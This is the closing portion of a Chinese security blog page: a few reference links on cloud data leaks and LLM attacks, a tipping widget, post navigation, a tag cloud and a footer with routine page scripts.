+<p>[5] 绿盟科技云上数据泄露安全报告（第五期）. <a href="https://book.yunzhan365.com/tkgd/rpyc/mobile/index.html">https://book.yunzhan365.com/tkgd/rpyc/mobile/index.html</a></p>
+<p>[6] Wiz Research: DeepSeek Database Exposure. <a href="https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak">https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak</a></p>
+<p>[7] Sysdig: LLM Jacking Targets DeepSeek. <a href="https://sysdig.com/blog/llmjacking-targets-deepseek/">https://sysdig.com/blog/llmjacking-targets-deepseek/</a></p>
+<p>[8] Zenity: AgentFlayer — ChatGPT Connectors 0-Click Attack. <a href="https://labs.zenity.io/p/agentflayer-chatgpt-connectors-0click-attack-5b4">https://labs.zenity.io/p/agentflayer-chatgpt-connectors-0click-attack-5b4</a></p>
+<p>[9] Verizon 2025 Data Breach Investigations Report. <a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://puming.zone">Ming Blog</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="1">1元</button>
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="30">30元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/2025-8-25-%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5%E8%BF%91%E6%9C%9F%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90/" data-toggle="tooltip" data-placement="top" title="提示词注入：近期大模型安全漏洞案例剖析">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/2026-01-29-openclaw%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E4%B8%89%E5%88%A9%E7%94%A8%E7%BD%91%E5%85%B3%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0openclaw%E6%8E%A7%E5%88%B6%E7%AB%AF1-click-rce-cve-2026-25253/" data-toggle="tooltip" data-placement="top" title="OpenClaw安全实战系列(三)：利用网关劫持实现 OpenClaw 控制端 1-Click RCE (CVE-2026-25253)">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/ai%E5%AE%89%E5%85%A8" title="ai安全">
+                            ai安全
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/anan" title="anan">
+                            anan
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/api-gateway" title="api-gateway">
+                            api-gateway
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/api-security" title="api-security">
+                            api-security
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/api%E5%AE%89%E5%85%A8" title="api安全">
+                            api安全
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/application" title="application">
+                            application
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/cloud-native" title="cloud-native">
+                            cloud-native
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/cve-2026-25253" title="cve-2026-25253">
+                            cve-2026-25253
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/devops" title="devops">
+                            devops
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/devsecops" title="devsecops">
+                            devsecops
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/kubernetes" title="kubernetes">
+                            kubernetes
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/life" title="life">
+                            life
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/llm" title="llm">
+                            llm
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/llm%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90" title="llm攻击面分析">
+                            llm攻击面分析
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/netease-cloud-music" title="netease-cloud-music">
+                            netease-cloud-music
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/offensive-and-defensive" title="offensive-and-defensive">
+                            offensive-and-defensive
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/openclaw" title="openclaw">
+                            openclaw
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/photography" title="photography">
+                            photography
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/rce" title="rce">
+                            rce
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/rsa" title="rsa">
+                            rsa
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/saas" title="saas">
+                            saas
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/security" title="security">
+                            security
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/serverless" title="serverless">
+                            serverless
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/service-mesh" title="service-mesh">
+                            service-mesh
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/verizon" title="verizon">
+                            verizon
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/websocket" title="websocket">
+                            websocket
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%BA%91%E4%B8%8A%E9%A3%8E%E9%99%A9%E5%8F%91%E7%8E%B0" title="云上风险发现">
+                            云上风险发现
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8" title="云原生安全">
+                            云原生安全
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8" title="云安全">
+                            云安全
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%BA%91%E8%AE%A1%E7%AE%97" title="云计算">
+                            云计算
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8" title="供应链安全">
+                            供应链安全
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%A4%A7%E6%A8%A1%E5%9E%8B" title="大模型">
+                            大模型
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8" title="大模型安全">
+                            大模型安全
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8" title="大模型应用">
+                            大模型应用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%A8%81%E8%83%81%E8%A1%8C%E4%B8%BA" title="威胁行为">
+                            威胁行为
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6" title="安全事件">
+                            安全事件
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5" title="提示词注入">
+                            提示词注入
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F" title="数据泄漏">
+                            数据泄漏
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2" title="数据泄露">
+                            数据泄露
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98" title="网络空间测绘">
+                            网络空间测绘
+                        </a>
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                   
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Ming Blog" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+                   
+                    
+                    <li>
+                        <a href="mailto:pumingdrinkcola@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+
+                    
+                    <li>
+                        <a href="https://twitter.com/puming4">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+
+                    
+
+		    
+                    
+                    <li>
+                        <a target="_blank" href="/img/wechat_qrcode.jpg">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-weixin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/CalbeeMing0530">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://www.linkedin.com/in/%E6%98%8E-%E6%B5%A6-1798a3162/">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            <li>
+                <a target="_blank" href="https://www.instagram.com/calbeeming/">
+                    <span class="fa-stack fa-lg">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-instagram fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+            </li>
+            
+            
+                </ul>
+		<p class="copyright text-muted">
+		    Copyright © Ming Blog 2023
+                    <br>
+                    
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+</body>
+</html>
